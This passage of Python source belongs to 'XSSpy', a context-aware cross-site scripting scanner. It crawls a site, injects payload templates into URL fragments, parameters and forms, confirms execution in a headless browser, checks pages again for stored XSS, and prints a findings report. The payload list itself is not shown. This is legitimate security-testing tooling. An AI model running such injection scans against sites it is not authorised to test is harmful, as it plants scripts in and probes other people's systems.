        # (Same logic as v11, uses self.driver, self.log etc.)
        if not self.driver: return []
        log.info(f"Scanning (DOM XSS via Hash) {url}...")
        confirmed_dom_vulns = []; base_url = url.split('#')[0]
        for payload_template in self.payload_templates: # Use loaded/default list
            marker = f"{STORED_MARKER_PREFIX}_{uuid.uuid4().hex[:8]}"
            formatted_payload = format_payload(payload_template, marker)
            try:
                 encoded_payload = quote(formatted_payload, safe=':/~?=&%'); test_url = f"{base_url}#{encoded_payload}"
            except Exception as e_quote: log.warning(f"  [!] Error encoding payload for URL hash: {formatted_payload[:50]}... ({e_quote})"); continue
            confirmation_type, confirmation_detail = self._confirm_xss_with_headless(test_url, payload_description=f"Hash Payload: {formatted_payload[:50]}...")
            if confirmation_type:
                extracted_marker = None
                if confirmation_type == "Alert" and confirmation_detail:
                     match = re.search(f"({STORED_MARKER_PREFIX}_[a-f0-9]+)", confirmation_detail)
                     if match: extracted_marker = match.group(1)
                confirmed_dom_vulns.append({'type': 'DOM-based XSS (Confirmed - Hash)', 'url': url, 'source': 'URL Fragment (#)', 'payload': formatted_payload, 'payload_template': payload_template, 'marker': marker, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': test_url, 'extracted_marker': extracted_marker })
        return confirmed_dom_vulns

    def _verify_stored_xss(self, visited_urls):
        """Re-visits discovered URLs to check for stored XSS execution and correlate."""
        # (Same logic as v9, uses self.driver, self.log etc.)
        if not self.driver: log.warning("Skipping Stored XSS verification phase (headless browser disabled)."); return []
        log.info(f"--- Phase 2: Stored XSS Verification (Re-visiting {len(visited_urls)} URLs) ---")
        correlated_stored_vulns = []
        for i, url in enumerate(visited_urls):
            log.info(f"Checking URL ({i+1}/{len(visited_urls)}) for stored execution: {url}")
            if self.delay > 0: time.sleep(self.delay)
            confirmation_type, confirmation_detail = self._confirm_xss_with_headless(url, payload_description="Stored XSS Check")
            if confirmation_type == "Alert" and confirmation_detail:
                match = re.search(f"({STORED_MARKER_PREFIX}_[a-f0-9]+)", confirmation_detail)
                if match:
                    extracted_marker = match.group(1); log.warning(f"  [!] Marker found in alert: {extracted_marker}")
                    original_submission = self.marker_to_submission.get(extracted_marker)
                    if original_submission:
                        log.critical(f"  [***] Correlated Stored XSS Found!") # Log critical finding
                        correlated_stored_vulns.append({'type': 'Stored XSS (Correlated)', 'url': url, 'payload': format_payload(original_submission['payload_template'], extracted_marker), 'payload_template': original_submission['payload_template'], 'marker': extracted_marker, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url, 'original_submission': original_submission })
                    else:
                        log.warning(f"  [!] Found marker {extracted_marker} but no matching submission log entry!")
                        correlated_stored_vulns.append({'type': 'Stored XSS (Potential - Uncorrelated Marker)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
                else:
                     log.warning(f"  [!] Potential Stored XSS detected (Alert confirmed, no marker): {url}")
                     correlated_stored_vulns.append({'type': 'Stored XSS (Potential - No Marker)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
            elif confirmation_type == "DOM Change":
                 log.warning(f"  [!] Potential Stored XSS detected (DOM change confirmed, no correlation): {url}")
                 correlated_stored_vulns.append({'type': 'Stored XSS (Potential - DOM Change)', 'url': url, 'payload': 'Unknown', 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': url})
        log.info(f"Phase 2 Stored XSS Verification finished. Found {len(correlated_stored_vulns)} potential/correlated instances.")
        return correlated_stored_vulns

    def crawl_and_scan(self, executor):
        """Performs the main crawl and scan operations."""
        if not self.base_domain: log.error("Cannot start scan, base domain not determined."); return [], set()

        queue = deque([(self.start_url, 0)]); self.visited_urls.add(self.start_url)
        phase1_vulnerabilities = []

        log.info("--- Phase 1: Crawling and Initial Scan (Reflected/DOM) ---")
        while queue:
            current_url, current_depth = queue.popleft()
            log.info(f"Scanning URL: {current_url} (Depth: {current_depth})")
            if current_depth >= self.max_depth: continue

            if self.delay > 0: log.debug(f"Delaying for {self.delay} second(s)..."); time.sleep(self.delay)

            # --- Reflected Scan ---
            confirmed_reflected = self._scan_page_reflected_context_aware(current_url, executor)
            phase1_vulnerabilities.extend(confirmed_reflected)

            # --- DOM Scan ---
            if self.driver:
                 confirmed_dom_hash = self._scan_dom_source_hash(current_url)
                 phase1_vulnerabilities.extend(confirmed_dom_hash)
                 confirmed_dom_query = self._scan_dom_source_query(current_url, executor)
                 phase1_vulnerabilities.extend(confirmed_dom_query)
            # else: log.info("Skipping DOM XSS checks (headless disabled).") # Already logged elsewhere

            # --- Find Links ---
            if current_depth < self.max_depth - 1:
                log.info(f"Discovering links on {current_url}...")
                new_links = self._get_links(current_url); added_count = 0
                for link in new_links:
                    if link not in self.visited_urls:
                         self.visited_urls.add(link); queue.append((link, current_depth + 1)); added_count += 1
                if added_count > 0: log.info(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")

        log.info(f"Phase 1 Crawl finished. Visited {len(self.visited_urls)} unique URLs.")
        self.findings.extend(phase1_vulnerabilities)
        return self.visited_urls # Return visited URLs for phase 2

    def run_scan(self):
        """Runs the complete scan process (Phase 1 and Phase 2)."""
        start_time = time.time()
        visited_for_phase2 = set()

        # --- Phase 1 ---
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.workers) as executor:
            visited_for_phase2 = self.crawl_and_scan(executor)

        # --- Phase 2 ---
        if not self.skip_stored_check and self.use_headless and visited_for_phase2:
            stored_vulns = self._verify_stored_xss(visited_for_phase2)
            self.findings.extend(stored_vulns)
        elif self.skip_stored_check: log.info("Skipping Phase 2 Stored XSS verification as requested.")
        elif not self.use_headless: log.info("Skipping Phase 2 Stored XSS verification (requires headless browser).")

        end_time = time.time()
        log.info(f"Scan Finished in {end_time - start_time:.2f} seconds.")

    def report_findings(self):
        """Prints a summary of confirmed findings."""
        print("\n--- Scan Summary ---") # Use print for final summary
        if self.findings:
            print(f"\n[***] Found {len(self.findings)} CONFIRMED XSS vulnerabilities:")
            # Sort/Group for clarity
            self.findings.sort(key=lambda x: (x['url'], x['type']))
            for vuln in self.findings:
                 display_payload = str(vuln.get('payload', 'N/A'))
                 display_payload = display_payload[:80] + '...' if len(display_payload) > 80 else display_payload
                 display_confirm_detail = str(vuln.get('confirmation_detail', 'N/A'))
                 if len(display_confirm_detail) > 60: display_confirm_detail = display_confirm_detail[:57] + '...'
                 base_info = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({display_confirm_detail}), Payload: {display_payload}"

                 if vuln['type'] == 'URL Parameter':
                     print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {base_info}, Final URL: {vuln['final_url']}")
                 elif vuln['type'] == 'Form Input':
                      print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {base_info}, Final URL: {vuln['final_url']}")
                 elif vuln['type'] == 'DOM-based XSS (Confirmed - Hash)':
                      print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, {base_info}, Trigger URL: {vuln['final_url']}")
                 elif vuln['type'] == 'DOM-based XSS (Confirmed - Query Param)':
                      print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, Sink Hint: {vuln.get('sink_detected', 'N/A')}, {base_info}, Trigger URL: {vuln['final_url']}")
                 elif vuln['type'] == 'DOM-based XSS (Potential)':
                      print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, Confirm: {vuln.get('confirmation_type', 'N/A')}, Marker: {display_payload}")
                 elif vuln['type'] == 'Stored XSS (Correlated)':
                      orig_sub = vuln.get('original_submission', {}); orig_ctx = orig_sub.get('context', 'N/A'); orig_url = orig_sub.get('submit_url', 'N/A'); orig_details = orig_sub.get('details', {})
                      print(f"  - URL: {vuln['url']}, {base_info}")
                      print(f"    -> Correlated to submission: URL='{orig_url}', Context='{orig_ctx}', Details='{orig_details}', Marker='{vuln.get('marker')}'")
                 elif 'Stored XSS (Potential' in vuln['type']:
                      print(f"  - URL: {vuln['url']}, {base_info} (Correlation N/A)")
                 else: print(f"  - {vuln}")
        else:
            print("\n[*] No vulnerabilities confirmed via headless browser during any phase.")
            if not self.use_headless: print("    (Headless confirmation and related checks were disabled.)")

    def close(self):
        """Cleans up resources like the Selenium driver."""
        if self.driver:
            log.info("Closing headless browser...")
            try:
                self.driver.quit()
            except Exception as e:
                log.error(f"Error closing Selenium driver: {e}")
        log.info("XSSpy scanner finished.")


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"XSSpy Scanner v{__version__} - Context-Aware XSS Scanner. Use Responsibly!",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter # Show defaults in help
    )
    # Input/Output Arguments
    parser.add_argument("url", help="The starting URL to scan (e.g., https://example.com)")
    parser.add_argument("-pL", "--payload-list", help="Path to payload file (templates/static payloads)")
    parser.add_argument("-o", "--output-log", help="File to write detailed scan logs to")
    parser.add_argument("-v", "--verbose", action="store_const", dest="loglevel", const=logging.DEBUG, default=logging.INFO, help="Enable verbose (debug) logging")
    parser.add_argument("-q", "--quiet", action="store_const", dest="loglevel", const=logging.WARNING, help="Suppress informational messages (show warnings/errors only)")

    # Scan Control Arguments
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS_DEFAULT, help="Number of concurrent workers for checks")
    parser.add_argument("--delay", type=float, default=0, help="Delay in seconds between page scans")
    parser.add_argument("--user-agent", help="Custom User-Agent string")

    # Feature Toggles
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation AND context-aware/DOM/Stored checks")
    parser.add_argument("--skip-stored-check", action="store_true", help="Skip the phase 2 stored XSS verification crawl")
    # Could add --skip-reflected, --skip-dom etc.

    args = parser.parse_args()

    # --- Configure Logging ---
    log.setLevel(args.loglevel)
    if args.output_log:
        try:
            # Add file handler if specified
            file_handler = logging.FileHandler(args.output_log, mode='w') # Overwrite log file
            file_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
            file_handler.setFormatter(file_formatter)
            log.addHandler(file_handler)
            log.info(f"Logging detailed output to: {args.output_log}")
        except Exception as e:
            log.error(f"Failed to open log file {args.output_log}: {e}")
            sys.exit(1)
    # --- End Logging Config ---


    # Load payloads
    payload_templates_to_use = DEFAULT_PAYLOADS
    if args.payload_list:
        loaded_payloads = load_payloads(args.payload_list) # Uses log internally now
        if loaded_payloads: payload_templates_to_use = loaded_payloads
        else: log.warning("Failed to load payloads from file, using default list.")
    else: log.info("No payload list provided, using default list.")

    # Initialize and run scanner
    try:
        scanner = Scanner(
            start_url=args.url,
            max_depth=args.depth,
            workers=args.workers,
            payload_templates=payload_templates_to_use,
            delay=args.delay,
            user_agent=args.user_agent,
            no_headless=args.no_headless,
            skip_stored=args.skip_stored_check
        )
        scanner.run_scan()
        scanner.report_findings() # Print summary to console regardless of logging
        scanner.close()

    except ValueError as ve: # Catch invalid URL from constructor
         log.critical(f"Initialization Error: {ve}")
         sys.exit(1)
    except KeyboardInterrupt:
         log.warning("\nScan interrupted by user.")
         # Attempt graceful shutdown? Scanner object might not exist fully.
         # if 'scanner' in locals() and scanner: scanner.close()
         print("\nScan aborted.", file=sys.stderr) # Use print for abrupt exit msg
         sys.exit(1)
    except Exception as e:
         log.critical(f"An unexpected critical error occurred: {e}", exc_info=True) # Log traceback
         # if 'scanner' in locals() and scanner: scanner.close()
         sys.exit(1)

